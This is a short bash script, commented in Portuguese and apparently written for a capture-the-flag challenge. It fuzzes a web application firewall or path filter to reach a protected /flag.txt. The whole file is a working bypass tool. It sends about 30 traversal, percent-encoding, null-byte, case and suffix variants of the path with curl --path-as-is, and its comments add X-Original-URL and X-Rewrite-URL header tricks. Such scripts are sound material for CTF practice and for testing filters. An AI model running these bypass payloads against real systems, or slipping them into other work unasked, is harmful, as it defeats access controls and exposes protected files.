#!/usr/bin/env bash
# WAForte - WAF/path-filter bypass fuzz para /flag.txt
# Uso: edite URL e COOKIE (sessao efemera da instancia) e rode. NAO roda sozinho contra o alvo.
set -u
URL="${1:-http://<HOST>:42126}"
COOKIE="${COOKIE:-rick; morty=rick; rick=morty; session=<SESSION_COOKIE>}"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36'

paths=(
  '/flag.txt' '//flag.txt' '/./flag.txt' '/x/../flag.txt' '/%2e/flag.txt'
  '/flag.txt/' '/flag.txt/.' '/flag.txt/..'
  '/%66lag.txt' '/fl%61g.txt' '/flag%2etxt' '/flag.tx%74' '/%2566lag.txt'
  '/FLAG.TXT' '/Flag.txt'
  '/flag.txt%00' '/flag.txt%20' '/flag.txt%09' '/flag.txt.' '/flag.txt;' '/flag.txt;.css'
  '/flag.txt?' '/flag.txt?x=1' '/flag.txt%23'
  '/..%2fflag.txt' '/..%2f..%2fflag.txt' '/flag.txt..;/' '/;/flag.txt'
  '/./flag.txt/../flag.txt'
)

for p in "${paths[@]}"; do
  code=$(curl -s -o /tmp/waf_body -w '%{http_code} %{size_download}' -g \
    --path-as-is "$URL$p" -H "User-Agent: $UA" -b "$COOKIE" --insecure)
  printf '%-30s -> %s\n' "$p" "$code"
done

# Headers de rewrite (WAF como proxy na frente):
#   curl -s -i --insecure "$URL/" -H "X-Original-URL: /flag.txt" -b "$COOKIE" | head -20
#   curl -s -i --insecure "$URL/anything" -H "X-Rewrite-URL: /flag.txt" -b "$COOKIE" | head -20
